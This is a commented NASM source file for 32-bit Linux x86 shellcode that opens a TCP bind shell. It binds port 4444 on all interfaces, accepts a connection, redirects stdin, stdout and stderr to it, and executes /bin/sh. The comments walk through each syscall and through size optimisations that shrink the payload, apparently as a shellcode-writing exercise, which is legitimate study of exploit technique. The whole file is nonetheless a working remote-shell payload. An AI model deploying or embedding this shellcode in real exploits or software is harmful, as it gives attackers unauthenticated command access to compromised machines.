; Filename: shell_bind_tcp.nasm
; Author: Ray Doyle
; Website: https://www.doyler.net

global _start            

section .text
_start:
    ; http://man7.org/linux/man-pages/man2/socket.2.html

    ; Move 102 (sys_socketcall) into EAX
    ;xor eax, eax
    ;mov al, 0x66
    ; Push/Pop saves 1 byte
    push 0x66
    pop eax

    ; Move 1 (SYS_SOCKET) into EBX
    ;xor ebx, ebx
    ;mov bl, 0x1
    ; Push/Pop saves 1 byte
    push 0x1
    pop ebx

    ; int sock = socket(AF_INET, SOCK_STREAM, 0);

    ; Push the variables for the socket() call onto the stack in reverse order
    ; Push 0 onto the stack (IP - 3rd argument)
    xor esi, esi
    push esi

    ; Push 1 onto the stack (SOCK_STREAM - 2nd argument)
    ;push 0x1
    ; EBX already contains 0x1, saving 1 byte
    push ebx

    ; Push 2 onto the stack (AF_INET - 1st argument)
    push 0x2

    ; Move the stack pointer into ECX, to point to the arguments for socket()
    mov ecx, esp

    ; Execute the socket() call
    int 0x80

    ; Move the returned file descriptor from EAX to EDI for later usage
    ;mov edi, eax
    ; Pop/Xchg moves EAX into EDI as well as popping the 2 (former AF_INET) into EAX for the SYS_BIND argument (same number of bytes)
    pop edi
    xchg eax, edi

bind:
    ; http://man7.org/linux/man-pages/man2/bind.2.html

    ; Move 102 (sys_socketcall) into EAX
    ;xor eax, eax
    ; EAX was cleared by the previous xchg, saving 2 bytes
    ;mov al, 0x66
    ; Moving this into bl, to swap with EAX
    mov bl, 0x66

    ; Move 2 (SYS_BIND) into EBX
    ;xor ebx, ebx
    ;mov bl, 0x2
    ; EAX already contains 0x2 and EBX contains 0x66, the xchg puts them in the correct register (saving 3 bytes)
    xchg eax, ebx

    ; struct sockaddr_in address;
    ; address.sin_family = AF_INET;
    ; address.sin_addr.s_addr = INADDR_ANY;
    ; address.sin_port = htons(PORT);

    ; Creating the sockaddr_in structure
    ; Push 0 (INADDR_ANY) onto the stack
    ;xor esi, esi
    ; ESI is already 0, saving 2 bytes
    push esi

    ; Push 4444 (PORT) onto the stack
    push word 0x5c11  ; Port number in network byte (big endian) order = 4444

    ; Push 2 (AF_INET) onto the stack
    ;push word 0x2
    ; EBX already contains 0x2, saving 1 byte
    push word bx

    ; Move the stack pointer into ECX, to point to the sockaddr_in struct
    mov ecx, esp

    ; bind(sock, (struct sockaddr *)&address, sizeof(address));
    
    ; Push 16 (the length of the address struct) onto the stack - 3rd argument
    push 0x10

    ; Push ECX (the pointer to the address structure) onto the stack - 2nd argument
    push ecx

    ; Push EDI (the saved file descriptor for the socket) onto the stack - 1st argument
    push edi

    ; Move the stack pointer into ECX, to point to the arguments for bind()
    mov ecx, esp

    ; Execute the bind() call
    int 0x80
    
listen:
    ; http://man7.org/linux/man-pages/man2/listen.2.html

    ; Move 102 (sys_socketcall) into EAX
    ;xor eax, eax
    ; EAX is already empty except for the lowest register, saving 2 bytes
    mov al, 0x66

    ; Move 4 (SYS_LISTEN) into EBX
    ;xor ebx, ebx
    ; EBX is already empty except for the lowest register, saving 2 bytes
    mov bl, 0x4

    ; listen(sock, 0);

    ; Push 0 (backlog) onto the stack - 2nd argument
    ;xor esi, esi
    ; ESI is still empty, saving 2 bytes
    push esi

    ; Push EDI (sockfd) onto the stack - 1st argument
    push edi

    ; Move the stack pointer into ECX, to point to the arguments for listen()
    mov ecx, esp
    
    ; Execute the listen() call
    int 0x80

accept:
    ; http://man7.org/linux/man-pages/man2/accept.2.html

    ; Move 102 (sys_socketcall) into EAX
    ;xor eax, eax
    ; EAX is already empty except for the lowest register, saving 2 bytes
    mov al, 0x66

    ; Move 5 (SYS_ACCEPT) into EBX
    ;xor ebx, ebx
    ; EBX is already empty except for the lowest register, saving 2 bytes
    ;mov bl, 0x5
    ; EBX already contains 0x4, increment saves 1 byte
    inc ebx

    ; int new_sock = accept(sock, NULL, NULL);

    ; Push 0 (addrlen) onto the stack - 3rd argument
    ;xor esi, esi
    ; ESI is still empty, saving 2 bytes
    push esi

    ; Push 0 (addr) onto the stack - 2nd argument
    ;xor esi, esi
    ; ESI is still empty, saving 2 bytes
    push esi

    ; Push EDI (sockfd) onto the stack - 1st argument
    push edi

    ; Move the stack pointer into ECX, to point to the arguments for accept()
    mov ecx, esp

    ; Execute the accept() call
    int 0x80

    ; Move the returned file descriptor from EAX to EDI for later usaged
    ;mov edi, eax
    ; Instead of saving the fd in EDI, put it directly in EBX (argument for sys_dup2), saves 1 byte now even
    xchg eax, ebx

dup:
    ; http://man7.org/linux/man-pages/man2/dup2.2.html
    
    ; Move 63 (sys_dup2) into EAX
    ;xor eax, eax
    ; EAX is already empty except for the lowest register, saving 2 bytes
    ;mov al, 0x3f
    ; This will be covered by the new loop below
    ; Original dup code = 40 bytes (including xor eax, eax and mov al, 0x3f)
    ; New dup loop = 11 bytes (SAVING 29 BYTES TOTAL!)

    
    ;
    ;
    ;
    ;
    ; dup2(new_sock, 0);
    ;
    ; Move 0 (STDIN) into ECX - 2nd argument
    ;xor ecx, ecx
    ;
    ; Move EDI (the saved file descriptor for the socket) into EBX - 1st argument
    ;mov ebx, edi
    ;
    ; Execute the dup2() call
    ;int 0x80
    ;
    ; Move 63 (sys_dup2) into EAX
    ;xor eax, eax
    ;mov al, 0x3f
    ;
    ; dup2(new_sock, 1);
    ;
    ; Move 1 (STDOUT) into ECX - 2nd argument
    ;xor ecx, ecx
    ;mov cl, 0x1
    ;
    ; Move EDI (the saved file descriptor for the socket) into EBX - 1st argument
    ;mov ebx, edi
    ;
    ; Execute the dup2() call
    ;int 0x80
    ;
    ; Move 63 (sys_dup2) into EAX
    ;xor eax, eax
    ;mov al, 0x3f
    ;
    ; dup2(new_sock, 2);
    ;
    ; Move 2 (STDERR) into ECX - 2nd argument
    ;xor ecx, ecx
    ;mov cl, 0x2
    ;
    ; Move EDI (the saved file descriptor for the socket) into EBX - 1st argument
    ;mov ebx, edi
    ;
    ; Execute the dup2() call
    ;int 0x80
    ;
    ;
    ;
    ;

    ; Load 0x2 into ECX as a loop counter, this will be used to loop through STDERR(2), STDOUT(1), and STDIN(0)
    xor ecx, ecx
    mov cl, 0x2

dup_loop:
    mov al, 0x3f
    int 0x80
    dec ecx
    jns dup_loop

execve:
    ; http://man7.org/linux/man-pages/man2/execve.2.html

    ; Push the first null dword (terminate the filename) 
    ;xor eax, eax
    ;push eax
    ; ESI is already empty, push it onto the stack as the null terminator
    push esi

    ; Move 11 (sys_execve) into EAX
    mov al, 0xb

    ; execve("/bin/sh", NULL, NULL);

    ; Push //bin/sh (8 bytes) onto the stack
    push 0x68732f2f
    push 0x6e69622f

    ; Move the stack pointer into EBX, to point to the filename
    mov ebx, esp

    ; Move 0 (argv) into ECX
    ;xor ecx, ecx
    ; ECX contains 0xffffffff after the dup loop, so increment saves 1 byte
    inc ecx

    ; Move 0 (envp) into EDX
    xor edx, edx

    ; Execute the execve() call
    int 0x80